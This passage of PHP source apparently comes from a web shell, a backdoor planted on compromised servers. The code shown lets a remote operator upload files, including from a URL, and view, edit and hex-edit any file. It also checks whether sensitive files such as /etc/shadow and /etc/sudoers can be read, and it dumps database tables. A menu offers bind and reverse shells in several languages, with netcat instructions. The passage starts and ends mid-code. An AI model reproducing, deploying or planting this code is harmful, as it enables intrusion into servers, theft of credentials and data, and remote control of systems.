			else $s_msg = "<p class='notif'>Failed to upload ".$s_fn."</p>";
		}
		else{
			if(!is_writable($s_cwd)) $s_msg = "<p class='notif'>Directory ".$s_cwd." is not writable, please change to a writable one</p>";
		}

		if(!empty($s_msg)) $s_result .= $s_msg;
		$s_result .= "
			<form action='".$s_self."' method='post' enctype='multipart/form-data'>
			<div class='mybox'><h2>Upload from computer</h2>
			<table class='myboxtbl'>
			<tr><td style='width:140px;'>File</td><td><input type='file' name='filepath' class='inputzbut' style='width:400px;margin:0;' />
			</td></tr>
			<tr><td>Save to</td><td><input style='width:100%;' class='inputz' type='text' name='savefolder' value='".$s_cwd."' /></td></tr>
			<tr><td>Filename (optional)</td><td><input style='width:100%;' class='inputz' type='text' name='savefilename' value='' /></td></tr>
			<tr><td>&nbsp;</td><td>
			<input type='submit' name='uploadhd' class='inputzbut' value='Upload !' style='width:120px;height:30px;margin:10px 2px 0 2px;' />
			<input type='hidden' name='x' value='upload' />
			</td></tr>
			</table>
			</div>
			</form>
			<form action='".$s_self."' method='post'>
			<div class='mybox'><h2>Upload from internet</h2>
			<table class='myboxtbl'>
			<tr><td style='width:150px;'>File URL</td><td><input style='width:100%;' class='inputz' type='text' name='fileurl' value='' />
			</td></tr>
			<tr><td>Save to</td><td><input style='width:100%;' class='inputz' type='text' name='savefolderurl' value='".$s_cwd."' /></td></tr>
			<tr><td>Filename (optional)</td><td><input style='width:100%;' class='inputz' type='text' name='savefilenameurl' value='' /></td></tr>
			<tr><td>&nbsp;</td><td>
			<input type='submit' name='uploadurl' class='inputzbut' value='Upload !' style='width:120px;height:30px;margin:10px 2px 0 2px;' />
			<input type='hidden' name='x' value='upload' />
			</td></tr>
			</table>
			</div>
			</form>
			";
	} // view file
	elseif(isset($_REQUEST['view'])){
		$s_f = ss($_REQUEST['view']);
		if(isset($s_fnew) && (trim($s_fnew)!="")) $s_f = $s_fnew;
		$s_owner = "";
		if(is_file($s_f)){
			if(!$s_win && $s_posix){
				$s_name = posix_getpwuid(fileowner($s_f));
				$s_group = posix_getgrgid(filegroup($s_f));
				$s_owner = "<tr><td>Owner</td><td>".$s_name['name']."<span class='gaya'>:</span>".$s_group['name']."</td></tr>";
			}
			$s_filn = basename($s_f);
			$s_dlfile = get_archiver_available();
			$s_dlfile = str_replace("__dlpath__",$s_filn,$s_dlfile);
			$s_dlfile = str_replace("__dlcwd__",$s_cwd,$s_dlfile);
			$s_result .= "<table class='viewfile' style='width:100%;'>
			<tr><td style='width:140px;'>Filename</td><td><span id='".cs($s_filn)."_link'>".$s_filn."</span>
			<div id='".cs($s_filn)."_form' class='sembunyi'>
			<form action='".$s_self."' method='post'>
				<input type='hidden' name='oldname' value='".$s_filn."' style='margin:0;padding:0;' />
				<input type='hidden' name='view' value='".basename($s_f)."' />
				<input class='inputz' style='width:200px;' type='text' name='newname' value='".$s_filn."' />
				<input class='inputzbut' type='submit' name='rename' value='rename' />
			</form>
			<input class='inputzbut' type='button' value='x' onclick=\"tukar('".cs($s_filn)."_form','".cs($s_filn)."_link');\" />
			</div>
			</td></tr>
			<tr><td>Size</td><td>".gs($s_f)." (".@filesize($s_f).")</td></tr>
			<tr><td>Permission</td><td>".gp($s_f)."</td></tr>
			".$s_owner."
			<tr><td>Create time</td><td>".@date("d-M-Y H:i:s",filectime($s_f))."</td></tr>
			<tr><td>Last modified</td><td>".@date("d-M-Y H:i:s",filemtime($s_f))."</td></tr>
			<tr><td>Last accessed</td><td>".@date("d-M-Y H:i:s",fileatime($s_f))."</td></tr>
			<tr><td>Actions</td><td>
			<a href='".$s_self."edit=".realpath($s_f)."' title='edit' onclick='return false;'>edit</a> |
			<a href='".$s_self."hexedit=".realpath($s_f)."' title='edit as hex' onclick='return false;'>hex</a> |
			<a href=\"javascript:tukar('".cs($s_filn)."_link','".cs($s_filn)."_form');\" title='rename'>ren</a> |
			<a href='".$s_self."del=".$s_filn."' title='delete' onclick='return false;'>del</a> ".$s_dlfile."
			</td></tr>
			<tr><td>View</td><td>
			<a href='".$s_self."view=".$s_filn."&type=text' onclick='return false;'>text</a> |
			<a href='".$s_self."view=".$s_filn."&type=code' onclick='return false;'>code</a> |
			<a href='".$s_self."view=".$s_filn."&type=image' onclick='return false;'>image</a> |
			<a href='".$s_self."view=".$s_filn."&type=audio' onclick='return false;'>audio</a> |
			<a href='".$s_self."view=".$s_filn."&type=video' onclick='return false;'>video</a>
			</td></tr>
			</table>
			";

			$s_t = "";

			$s_mime = "";
			$s_mime_list = gzinflate(base64_decode($s_mime_types));
			$s_ext = trim(substr($s_f, strrpos($s_f, ".")),".");
			if(preg_match("/([^\s]+)\ .*$s_ext.*/i",$s_mime_list,$s_r)){
				$s_mime = $s_r[1];
			}

			$s_iinfo = @getimagesize($s_f);
			if(strtolower(substr($s_filn,-3,3)) == "php") $s_t = "code";
			elseif(is_array($s_iinfo)) $s_t = 'image';
			elseif(!empty($s_mime)) $s_t = substr($s_mime,0,strpos($s_mime,"/"));

			if(isset($_REQUEST['type'])) $s_t = ss($_REQUEST['type']);

			if($s_t=="image"){
				$s_width = (int) $s_iinfo[0];
				$s_height = (int) $s_iinfo[1];
				$s_imginfo = "Image type = ( ".$s_iinfo['mime']." )<br />
					Image Size = <span class='gaul'>( </span>".$s_width." x ".$s_height."<span class='gaul'> )</span><br />";
				if($s_width > 800){
					$s_width = 800;
					$s_imglink = "<p><a href='".$s_self."img=".$s_filn."' onclick='return false;'>
					<span class='gaul'>[ </span>view full size<span class='gaul'> ]</span></a></p>";
				}
				else $s_imglink = "";

				$s_result .= "<div class='viewfilecontent' style='text-align:center;'>".$s_imglink."
					<img width='".$s_width."' src='".$s_self."img=".$s_filn."' alt='".$s_filn."' style='margin:8px auto;padding:0;border:0;' /></div>";

			}
			elseif($s_t=="code"){
				$s_result .= "<div class=\"viewfilecontent\">";
				$s_file = wordwrap(@file_get_contents($s_f),160,"\n",true);
				$s_buff = highlight_string($s_file,true);
				$s_old = array("0000BB","000000","FF8000","DD0000", "007700");
				$s_new = array("4C83AF","888888", "87DF45", "EEEEEE" , "FF8000");
				$s_buff = str_replace($s_old,$s_new, $s_buff);
				$s_result .= $s_buff;
				$s_result .=  "</div>";
			}
			elseif($s_t=="audio" || $s_t=="video"){
				$s_result .= "<div class='viewfilecontent' style='text-align:center;'>
							<".$s_t." controls>
							<source src='".$s_self."dltype=raw&dlpath=".$s_f."' type='".$s_mime."'>
								<object data='".$s_self."dltype=raw&dlpath=".$s_f."'>
									<embed src='".$s_self."dltype=raw&dlpath=".$s_f."'>
								</object>
							</".$s_t.">
					</div>";
			}
			else {
				$s_result .= "<pre style='padding: 3px 8px 0 8px;' class='viewfilecontent'>";
				$s_result .=  str_replace("<","&lt;",str_replace(">","&gt;",(wordwrap(@file_get_contents($s_f),160,"\n",true))));
				$s_result .=   "</pre>";
			}
		}
		elseif(is_dir($s_f)){
			chdir($s_f);
			$s_cwd = cp(getcwd());
			$s_result .= showdir($s_cwd);
		}
		else $s_result .= "<p class='notif'>Cannot find the path specified ".$s_f."</p>";

	} // edit file
	elseif(isset($_REQUEST['edit'])){
		$s_f = ss($_REQUEST['edit']);
		$s_fc = "";
		$s_fcs = "";

		if(isset($_REQUEST['new']) && ($_REQUEST['new']=='yes')){
			$s_num = 1;
			if(is_file($s_f)){
				$s_pos = strrpos($s_f,"_");
				if($s_pos!==false) $s_num = (int) substr($s_f,$s_pos+1);
				while(is_file(substr($s_f,0,$s_pos)."_".$s_num)){
					$s_num++;
				}
				$s_f = substr($s_f,0,$s_pos)."_".$s_num;
			}
		}
		else if(is_file($s_f)) $s_fc = @file_get_contents($s_f);


		if(isset($_REQUEST['fc'])){
			$s_fc = ssc($_REQUEST['fc']);
			if($s_filez = fopen($s_f,"w")){
				$s_time = @date("d-M-Y H:i:s",time());
				if(fwrite($s_filez,$s_fc)!==false) $s_fcs = "File saved @ ".$s_time;
				else $s_fcs = "Failed to save";
				fclose($s_filez);
			}
			else $s_fcs = "Permission denied";
		}
		else if(is_file($s_f) && !is_writable($s_f)) $s_fcs = "This file is not writable";

		if(!empty($s_fcs)) $s_result .= "<p class='notif'>".$s_fcs."</p>";
		$s_result .= "<form action='".$s_self."' method='post'>
				<textarea id='fc' name='fc' class='txtarea'>".hss($s_fc)."</textarea>
				<p style='text-align:center;'><input type='text' class='inputz' style='width:99%;' name='edit' value='".$s_f."' /></p>
				<p><input type='submit' name='fcsubmit' class='inputzbut' value='Save !' style='width:120px;height:30px;' /></p>
				</form>";

	}
	
	// hex edit file
	elseif(isset($_REQUEST['hexedit'])){
		$s_f = ss($_REQUEST['hexedit']);
		$s_fc = "";
		$s_fcs = "";
		$s_lnum = 0;
		$s_hexes = "";

		if(!empty($_REQUEST['hexes']) || !empty($_REQUEST['hexestxtarea'])){
			if(!empty($_REQUEST['hexes'])){
				foreach($_REQUEST['hexes'] as $s_hex)	$s_hexes .= str_replace(" ","", $s_hex);
			}
			elseif(!empty($_REQUEST['hexestxtarea'])){
				$s_hexes = trim($_REQUEST['hexestxtarea']);
			}
			if($s_filez = fopen($s_f,"w")){
					$s_bins = pack("H*" , $s_hexes);
					$s_time = @date("d-M-Y H:i:s",time());
					if(fwrite($s_filez,$s_bins)!==false) $s_fcs = "File saved @ ".$s_time;
					else $s_fcs = "Failed to save";
					fclose($s_filez);
				}
			else $s_fcs = "Permission denied";
		}
		else if(is_file($s_f) && !is_writable($s_f)) $s_fcs = "This file is not writable";

		if(!empty($s_fcs)) $s_result .= "<p class='notif'>".$s_fcs."</p>";
		$s_result .= "<form action='".$s_self."' method='post'>
					<p style='padding:0;text-align:center;'><input type='text' class='inputz' style='width:99%;' name='hexedit' value='".$s_f."' /></p>
					<p style='padding:0 0 14px 0;border-bottom:1px solid #393939;'><input type='submit' name='fcsubmit' class='inputzbut' value='Save !' style='width:120px;height:30px;' onclick=\"return submithex();\" /></p>
					<table class='explore'>
					";
		if(is_file($s_f)){
			$s_fp = fopen($s_f,"r");
			if($s_fp) {
				$s_ldump = "";
				$s_counter = 0;
				$s_icounter = 0;
				while(!feof($s_fp)){
					$s_line = fread($s_fp, 32);
					$s_linedump = preg_replace('/[^\x21-\x7E]/','.', $s_line);
					$s_linedump = str_replace(">",".",$s_linedump);
					$s_linedump = str_replace("<",".",$s_linedump);
					$s_linehex = strtoupper(bin2hex($s_line));
					$s_linex = str_split($s_linehex,2);
					$s_linehex = implode(" ", $s_linex);
					$s_addr = sprintf("%08xh",$s_icounter);

					$s_result .= "<tr><td style='text-align:center;width:60px;'>".$s_addr."</td><td style='text-align:left;width:580px;'>
					<input onclick=\"hexupdate('".$s_counter."',event);\" onkeydown=\"return hexfix('".$s_counter."',event);\" onkeyup=\"hexupdate('".$s_counter."',event);\" type='text' class='inputz' id='hex_".$s_counter."' name='hexes[]' value='".$s_linehex."' style='width:570px;' maxlength='".strlen($s_linehex)."' /></td>
					<td style='text-align:left;letter-spacing:2px;'>
					<pre name='hexdump' id='dump_".$s_counter."' style='margin:0;padding:0;'>".$s_linedump."</pre></td></tr>";
					$s_counter++;
					$s_icounter+=32;
				}
				$s_result .= "<input type='hidden' id='counter' value='".$s_counter."' />";
				$s_result .= "<textarea name='hexestxtarea' id='hexestxtarea' class='sembunyi'></textarea>";
				fclose($s_fp);
			}
		}
		$s_result .= "</table></form>";

	}// show server information
	elseif(isset($_REQUEST['x']) && ($_REQUEST['x']=='info')){
		$s_result = "";
		// server misc info
		$s_result .= "<p class='notif' onclick=\"toggle('info_server')\">Server Info</p>";
		$s_result .= "<div class='info' id='info_server'><table>";

		if($s_win){
			foreach (range("A","Z") as $s_letter){
				if((is_dir($s_letter.":\\") && is_readable($s_letter.":\\"))){
					$s_drive = $s_letter.":";
					$s_result .= "<tr><td>drive ".$s_drive."</td><td>".ts(disk_free_space($s_drive))." free of ".ts(disk_total_space($s_drive))."</td></tr>";
				}
			}
		}
		else $s_result .= "<tr><td>root partition</td><td>".ts(disk_free_space("/"))." free of ".ts(disk_total_space("/"))."</td></tr>";

		$s_result .= "<tr><td>php</td><td>".phpversion()."</td></tr>";
		if($s_python) $s_result .= "<tr><td>python</td><td>".exe("python -V")."</td></tr>";
		if($s_perl)	$s_result .= "<tr><td>perl</td><td>".exe("perl -e \"print \$s_]\"")."</td></tr>";
		if($s_ruby)	$s_result .= "<tr><td>ruby</td><td>".exe("ruby -v")."</td></tr>";
		if($s_gcc){
			$s_gcc_version = exe("gcc --version");
			$s_gcc_ver = explode("\n",$s_gcc_version);
			if(count($s_gcc_ver)>0) $s_gcc_ver = $s_gcc_ver[0];
			$s_result .= "<tr><td>gcc</td><td>".$s_gcc_ver."</td></tr>";
		}
		if($s_java) $s_result .= "<tr><td>java</td><td>".str_replace("\n", ", ", exe("java -version"))."</td></tr>";

		$s_interesting = array(
		"/etc/passwd", "/etc/shadow", "/etc/group", "/etc/issue", "/etc/motd", "/etc/sudoers", "/etc/hosts", "/etc/aliases", "/etc/resolv.conf", "/etc/sysctl.conf",
		"/etc/named.conf", "/etc/network/interfaces", "/etc/squid/squid.conf", "/usr/local/squid/etc/squid.conf",
		"/etc/ssh/sshd_config",
		"/etc/httpd/conf/httpd.conf", "/usr/local/apache2/conf/httpd.conf"," /etc/apache2/apache2.conf", "/etc/apache2/httpd.conf", "/usr/pkg/etc/httpd/httpd.conf", "/usr/local/etc/apache22/httpd.conf", "/usr/local/etc/apache2/httpd.conf", "/var/www/conf/httpd.conf", "/etc/apache2/httpd2.conf", "/etc/httpd/httpd.conf",
		"/etc/lighttpd/lighttpd.conf", "/etc/nginx/nginx.conf",
		"/etc/fstab", "/etc/mtab", "/etc/crontab", "/etc/inittab", "/etc/modules.conf", "/etc/modules");
		foreach($s_interesting as $s_f){
			if(is_file($s_f) && is_readable($s_f))
				$s_result .= "<tr><td>".$s_f."</td><td><a href='".$s_self."view=".$s_f."' onclick='return false;'>".$s_f." is readable</a></td></tr>";
		}


		$s_result .= "</table></div>";

		if(!$s_win){
			// cpu info
			if($s_i_buff=trim(@file_get_contents("/proc/cpuinfo"))){
				$s_result .= "<p class='notif' onclick=\"toggle('info_cpu')\">CPU Info</p>";
				$s_result .= "<div class='info' id='info_cpu'>";
				$s_i_buffs = explode("\n\n", $s_i_buff);
				foreach($s_i_buffs as $s_i_buffss){
					$s_i_buffss = trim($s_i_buffss);
					if($s_i_buffss!=""){
						$s_i_buffsss = explode("\n",$s_i_buffss);
						$s_result .= "<table>";
						foreach($s_i_buffsss as $s_i){
							$s_i = trim($s_i);
							if($s_i!=""){
								$s_ii = explode(":",$s_i);
								if(count($s_ii)==2) $s_result .= "<tr><td>".$s_ii[0]."</td><td>".$s_ii[1]."</td></tr>";
							}
						}
						$s_result .= "</table>";
					}
				}
				$s_result .= "</div>";
			}
			// mem info
			if($s_i_buff=trim(@file_get_contents("/proc/meminfo"))){
				$s_result .= "<p class='notif' onclick=\"toggle('info_mem')\">Memory Info</p>";
				$s_i_buffs = explode("\n",$s_i_buff);
				$s_result .= "<div class='info' id='info_mem'><table>";
				foreach($s_i_buffs as $s_i){
					$s_i = trim($s_i);
					if($s_i!=""){
						$s_ii = explode(":",$s_i);
						if(count($s_ii)==2) $s_result .= "<tr><td>".$s_ii[0]."</td><td>".$s_ii[1]."</td></tr>";
					}
					else $s_result .= "</table><table>";
				}
				$s_result .= "</table></div>";
			}
			// partition
			if($s_i_buff=trim(@file_get_contents("/proc/partitions"))){
				$s_i_buff = preg_replace("/\ +/"," ",$s_i_buff);
				$s_result .= "<p class='notif' onclick=\"toggle('info_part')\">Partitions Info</p>";
				$s_result .= "<div class='info' id='info_part'>";
				$s_i_buffs = explode("\n\n", $s_i_buff);
				$s_result .= "<table><tr>";
				$s_i_head = explode(" ",$s_i_buffs[0]);
				foreach($s_i_head as $s_h) $s_result .= "<th>".$s_h."</th>";
				$s_result .= "</tr>";
				$s_i_buffss = explode("\n", $s_i_buffs[1]);
				foreach($s_i_buffss as $s_i_b){
					$s_i_row = explode(" ",trim($s_i_b));
					$s_result .= "<tr>";
					foreach($s_i_row as $s_r) $s_result .= "<td style='text-align:center;'>".$s_r."</td>";
					$s_result .= "</tr>";
				}
				$s_result .= "</table>";
				$s_result .= "</div>";
			}
		}
		$s_phpinfo = array(
			"PHP General" => INFO_GENERAL,
			"PHP Configuration" => INFO_CONFIGURATION,
			"PHP Modules" => INFO_MODULES,
			"PHP Environment" => INFO_ENVIRONMENT,
			"PHP Variables" => INFO_VARIABLES
		);
		foreach($s_phpinfo as $s_p=>$s_i){
			$s_result .= "<p class='notif' onclick=\"toggle('".$s_i."')\">".$s_p."</p>";
			ob_start();
			eval("phpinfo(".$s_i.");");
			$s_b = ob_get_contents();
			ob_end_clean();
			$s_a = strpos($s_b,"<body>")+6;
			$s_z = strpos($s_b,"</body>");
			$s_body = substr($s_b,$s_a,$s_z-$s_a);
			$s_body = str_replace(",",", ",$s_body);
			$s_body = str_replace("&amp;","&",$s_body);
			$s_body = str_replace(";","; ",$s_body);
			$s_result .= "<div class='info' id='".$s_i."'>".$s_body."</div>";
		}
	} 
	
	// working with database
	elseif(isset($_REQUEST['x']) && ($_REQUEST['x']=='db')){
		// sqltype : mysql, mssql, oracle, pgsql, odbc, pdo
		$s_sqlhost = isset($_REQUEST['sqlhost'])? ssc($_REQUEST['sqlhost']) : "";
		$s_sqlport = isset($_REQUEST['sqlport'])? ssc($_REQUEST['sqlport']) : "";
		$s_sqluser = isset($_REQUEST['sqluser'])? ssc($_REQUEST['sqluser']) : "";
		$s_sqlpass = isset($_REQUEST['sqlpass'])? ssc($_REQUEST['sqlpass']) : "";
		$s_sqltype = isset($_REQUEST['sqltype'])? ssc($_REQUEST['sqltype']) : "";
		$s_show_form = true;
		$s_show_dbs = true;

		if(isset($_REQUEST['connect'])){
			$s_con = sql_connect($s_sqltype,$s_sqlhost,$s_sqluser,$s_sqlpass);
			$s_sqlcode = isset($_REQUEST['sqlcode']) ? urldecode(ssc($_REQUEST['sqlcode'])) : "";

			if($s_con!==false){
				$s_show_form = false;
				$s_result .= "<form action='".$s_self."' method='post'>
					<input type='hidden' name='sqlhost' value='".$s_sqlhost."' />
					<input type='hidden' name='sqlport' value='".$s_sqlport."' />
					<input type='hidden' name='sqluser' value='".$s_sqluser."' />
					<input type='hidden' name='sqlpass' value='".$s_sqlpass."' />
					<input type='hidden' name='sqltype' value='".$s_sqltype."' />
					<input type='hidden' name='x' value='db' />
					<input type='hidden' name='connect' value='connect' />
					<textarea id='sqlcode' name='sqlcode' class='txtarea' style='height:150px;'>".$s_sqlcode."</textarea>
					<p><input type='submit' name='gogo' class='inputzbut' value='Go !' style='width:120px;height:30px;' />
					&nbsp;&nbsp;Separate multiple commands with a semicolon  <span class='gaya'>[</span> ; <span class='gaya'>]</span></p>
					</form>";

				if(!empty($s_sqlcode)){
					$s_querys = explode(";",$s_sqlcode);
					foreach($s_querys as $s_query){
						if(trim($s_query) != ""){
							$s_hasil = sql_query($s_sqltype,$s_query,$s_con);
							if($s_hasil!=false){
								$s_result .= "<p style='padding:0;margin:6px 10px;font-weight:bold;'>".$s_query.";&nbsp;&nbsp;&nbsp;
								<span class='gaya'>[</span> ok <span class='gaya'>]</span></p>
								<table class='explore sortable' style='width:100%;'><tr>";
								for($s_i=0;$s_i<sql_num_fields($s_sqltype,$s_hasil);$s_i++)
									$s_result .= "<th>".@hss(sql_field_name($s_sqltype,$s_hasil,$s_i))."</th>";
								$s_result .= "</tr>";
								while($s_rows=sql_fetch_data($s_sqltype,$s_hasil)){
									$s_result .= "<tr>";
									foreach($s_rows as $s_r){
										if(empty($s_r)) $s_r = " ";
										$s_result .= "<td>".@hss($s_r)."</td>";
									}
									$s_result .= "</tr>";
								}
								$s_result .= "</table>";
							}
							else{
								$s_result .= "<p style='padding:0;margin:6px 10px;font-weight:bold;'>".$s_query.";&nbsp;&nbsp;&nbsp;
								<span class='gaya'>[</span> error <span class='gaya'>]</span></p>";
							}
						}
					}
				}
				else{
					if(($s_sqltype!='pdo') && ($s_sqltype!='odbc')){
						if($s_sqltype=='mysql') $s_showdb = "SHOW DATABASES";
						elseif($s_sqltype=='mssql') $s_showdb = "SELECT name FROM master..sysdatabases";
						elseif($s_sqltype=='pgsql') $s_showdb = "SELECT schema_name FROM information_schema.schemata";
						elseif($s_sqltype=='oracle') $s_showdb = "SELECT USERNAME FROM SYS.ALL_USERS ORDER BY USERNAME";
						elseif($s_sqltype=='sqlite3' || $s_sqltype=='sqlite') $s_showdb = "SELECT \"".$s_sqlhost."\"";
						else $s_showdb = "SHOW DATABASES";

						$s_hasil = sql_query($s_sqltype,$s_showdb,$s_con);

						if($s_hasil!=false) {
							while($s_rows_arr=sql_fetch_data($s_sqltype,$s_hasil)){
								foreach($s_rows_arr as $s_rows){
									$s_result .= "<p class='notif' onclick=\"toggle('db_".$s_rows."')\">".$s_rows."</p>";
									$s_result .= "<div class='info' id='db_".$s_rows."'><table class='explore'>";

									if($s_sqltype=='mysql') $s_showtbl = "SHOW TABLES FROM ".$s_rows;
									elseif($s_sqltype=='mssql') $s_showtbl = "SELECT name FROM ".$s_rows."..sysobjects WHERE xtype = 'U'";
									elseif($s_sqltype=='pgsql') $s_showtbl = "SELECT table_name FROM information_schema.tables WHERE table_schema='".$s_rows."'";
									elseif($s_sqltype=='oracle') $s_showtbl = "SELECT TABLE_NAME FROM SYS.ALL_TABLES WHERE OWNER='".$s_rows."'";
									elseif($s_sqltype=='sqlite3' || $s_sqltype=='sqlite') $s_showtbl = "SELECT name FROM sqlite_master WHERE type='table'";
									else $s_showtbl = "";

									$s_hasil_t = sql_query($s_sqltype,$s_showtbl,$s_con);
									if($s_hasil_t!=false) {
										while($s_tables_arr=sql_fetch_data($s_sqltype,$s_hasil_t)){
											foreach($s_tables_arr as $s_tables){
												if($s_sqltype=='mysql') $s_dump_tbl = "SELECT * FROM ".$s_rows.".".$s_tables." LIMIT 0,100";
												elseif($s_sqltype=='mssql') $s_dump_tbl = "SELECT TOP 100 * FROM ".$s_rows."..".$s_tables;
												elseif($s_sqltype=='pgsql') $s_dump_tbl = "SELECT * FROM ".$s_rows.".".$s_tables." LIMIT 100 OFFSET 0";
												elseif($s_sqltype=='oracle') $s_dump_tbl = "SELECT * FROM ".$s_rows.".".$s_tables." WHERE ROWNUM BETWEEN 0 AND 100;";
												elseif($s_sqltype=='sqlite' || $s_sqltype=='sqlite3') $s_dump_tbl = "SELECT * FROM ".$s_tables." LIMIT 0,100";
												else $s_dump_tbl = "";

												$s_dump_tbl_link = $s_self."x=db&connect=&sqlhost=".$s_sqlhost."&sqlport=".$s_sqlport."&sqluser=".$s_sqluser."&sqlpass=".$s_sqlpass."&sqltype=".$s_sqltype."&sqlcode=".$s_dump_tbl;

												$s_result .= "<tr><td ondblclick=\"return go('".addslashes($s_dump_tbl_link)."',event);\"><a href='".$s_dump_tbl_link."' onclick='return false;'>".$s_tables."</a></td></tr>";
											}
										}
									}
									$s_result .= "</table></div>";
								}
							}
						}
					}
				}
				sql_close($s_sqltype,$s_con);
			}
			else{
				$s_result .= "<p class='notif'>Unable to connect to database</p>";
				$s_show_form = true;
			}
		}

		if($s_show_form){
			// sqltype : mysql, mssql, oracle, pgsql, sqlite, sqlite3, odbc, pdo
			$s_sqllist = array();
			if(function_exists("mysql_connect")) $s_sqllist["mysql"] = "connect to MySQL <span style=\"font-size:12px;color:#999;\">- using mysql_*</span>";
			if(function_exists("mssql_connect") || function_exists("sqlsrv_connect")) $s_sqllist["mssql"] = "connect to MsSQL <span style=\"font-size:12px;color:#999;\">- using mssql_* or sqlsrv_*</span>";
			if(function_exists("pg_connect")) $s_sqllist["pgsql"] = "connect to PostgreSQL <span style=\"font-size:12px;color:#999;\">- using pg_*</span>";
			if(function_exists("oci_connect")) $s_sqllist["oracle"] = "connect to oracle <span style=\"font-size:12px;color:#999;\">- using oci_*</span>";
			if(function_exists("sqlite_open")) $s_sqllist["sqlite"] = "connect to SQLite <span style=\"font-size:12px;color:#999;\">- using sqlite_*</span>";
			if(class_exists("SQLite3")) $s_sqllist["sqlite3"] = "connect to SQLite3 <span style=\"font-size:12px;color:#999;\">- using class SQLite3</span>";
			if(function_exists("odbc_connect")) $s_sqllist["odbc"] = "connect via ODBC <span style=\"font-size:12px;color:#999;\">- using odbc_*</span>";
			if(class_exists("PDO")) $s_sqllist["pdo"] = "connect via PDO <span style=\"font-size:12px;color:#999;\">- using class PDO</span>";

			foreach($s_sqllist as $s_sqltype=>$s_sqltitle){
				if($s_sqltype=="odbc" || $s_sqltype=="pdo"){
					$s_result .= "<div class='mybox'><h2>".$s_sqltitle."</h2>
					<form action='".$s_self."' method='post' />
					<table class='myboxtbl'>
					<tr><td style='width:170px;'>DSN / Connection String</td><td><input style='width:100%;' class='inputz' type='text' name='sqlhost' value='' /></td></tr>
					<tr><td>Username</td><td><input style='width:100%;' class='inputz' type='text' name='sqluser' value='' /></td></tr>
					<tr><td>Password</td><td><input style='width:100%;' class='inputz' type='password' name='sqlpass' value='' /></td></tr>
					</table>
					<input type='submit' name='connect' class='inputzbut' value='Connect !' style='width:120px;height:30px;margin:10px 2px 0 2px;' />
					<input type='hidden' name='sqltype' value='".$s_sqltype."' />
					<input type='hidden' name='x' value='db' />
					</form>
					</div>";
				}
				elseif($s_sqltype=="sqlite" || $s_sqltype=="sqlite3"){
					$s_result .= "<div class='mybox'><h2>".$s_sqltitle."</h2>
					<form action='".$s_self."' method='post' />
					<table class='myboxtbl'>
					<tr><td style='width:170px;'>DB File</td><td><input style='width:100%;' class='inputz' type='text' name='sqlhost' value='' /></td></tr>
					</table>
					<input type='submit' name='connect' class='inputzbut' value='Connect !' style='width:120px;height:30px;margin:10px 2px 0 2px;' />
					<input type='hidden' name='sqltype' value='".$s_sqltype."' />
					<input type='hidden' name='x' value='db' />
					</form>
					</div>";
				}
				else{
					$s_result .= "<div class='mybox'><h2>".$s_sqltitle."</h2>
					<form action='".$s_self."' method='post' />
					<table class='myboxtbl'>
					<tr><td style='width:170px;'>Host</td><td><input style='width:100%;' class='inputz' type='text' name='sqlhost' value='' /></td></tr>
					<tr><td>Username</td><td><input style='width:100%;' class='inputz' type='text' name='sqluser' value='' /></td></tr>
					<tr><td>Password</td><td><input style='width:100%;' class='inputz' type='password' name='sqlpass' value='' /></td></tr>
					<tr><td>Port (optional)</td><td><input style='width:100%;' class='inputz' type='text' name='sqlport' value='' /></td></tr>
					</table>
					<input type='submit' name='connect' class='inputzbut' value='Connect !' style='width:120px;height:30px;margin:10px 2px 0 2px;' />
					<input type='hidden' name='sqltype' value='".$s_sqltype."' />
					<input type='hidden' name='x' value='db' />
					</form>
					</div>";
				}
			}

		}
	}

	// bind and reverse shell
	elseif(isset($_REQUEST['x']) && ($_REQUEST['x']=='rs')){
		//$s_server_ip = gethostbyname($_SERVER["HTTP_HOST"]);
		//$s_my_ip = $_SERVER['REMOTE_ADDR'];
		$s_rshost = $s_server_ip;

		$s_rsport = "13123";
		// resources $s_rs_pl $s_rs_py $s_rs_rb $s_rs_c $s_rs_win
		$s_rspesana = "Press &#39;  Go !  &#39; button and run &#39;  nc <i>server_ip</i> <i>port</i>  &#39; on your computer";
		$s_rspesanb = "Run &#39;  nc -l -v -p <i>port</i>  &#39; on your computer and press &#39;  Go !  &#39; button";

		//bind_pl bind_py bind_rb bind_c bind_win bind_php back_pl back_py back_rb back_c back_win back_php
		// resources $s_rs_pl $s_rs_py $s_rs_rb $s_rs_c $s_rs_win $s_rs_php
		$s_rsbind = array();
		$s_rsback = array();


		$s_rsbind["bind_php"] = "Bind Shell <span style='font-size:12px;color:#999;'>- php</span>";
		$s_rsback["back_php"] = "Reverse Shell <span style='font-size:12px;color:#999;'>- php</span>";

		if($s_perl){
			$s_rsbind["bind_pl"] = "Bind Shell <span style='font-size:12px;color:#999;'>- perl</span>";
			$s_rsback["back_pl"] = "Reverse Shell <span style='font-size:12px;color:#999;'>- perl</span>";
		}
		if($s_python){
			$s_rsbind["bind_py"] = "Bind Shell <span style='font-size:12px;color:#999;'>- python</span>";
			$s_rsback["back_py"] = "Reverse Shell <span style='font-size:12px;color:#999;'>- python</span>";
		}
		if($s_ruby){
			$s_rsbind["bind_rb"] = "Bind Shell <span style='font-size:12px;color:#999;'>- ruby</span>";
			$s_rsback["back_rb"] = "Reverse Shell <span style='font-size:12px;color:#999;'>- ruby</span>";
		}
		if($s_win){
			$s_rsbind["bind_win"] = "Bind Shell <span style='font-size:12px;color:#999;'>- windows executable</span>";
			$s_rsback["back_win"] = "Reverse Shell <span style='font-size:12px;color:#999;'>- windows executable</span>";
		}
		else{
			$s_rsbind["bind_c"] = "Bind Shell <span style='font-size:12px;color:#999;'>- c</span>";
			$s_rsback["back_c"] = "Reverse Shell <span style='font-size:12px;color:#999;'>- c</span>";
		}

		$s_rslist = array_merge($s_rsbind,$s_rsback);

		if(!is_writable($s_cwd)) $s_result .= "<p class='notif'>Directory ".$s_cwd." is not writable, please change to a writable one</p>";
		$s_rs_err = "";
		foreach($s_rslist as $s_rstype=>$s_rstitle){
			$s_split = explode("_",$s_rstype);
			if($s_split[0]=="bind"){
				$s_rspesan = $s_rspesana;
				$s_rsdisabled = "disabled='disabled'";
				$s_rstarget =	$s_server_ip;
				$s_labelip = "Server IP";
			}
			elseif($s_split[0]=="back"){
				$s_rspesan = $s_rspesanb;
				$s_rsdisabled = "";
				$s_rstarget =	$s_my_ip;
				$s_labelip = "Target IP";
			}
			if(isset($_REQUEST[$s_rstype])){
				if(isset($_REQUEST["rshost_".$s_rstype])) $s_rshost_ = ss($_REQUEST["rshost_".$s_rstype]);
				if(isset($_REQUEST["rsport_".$s_rstype])) $s_rsport_ = ss($_REQUEST["rsport_".$s_rstype]);

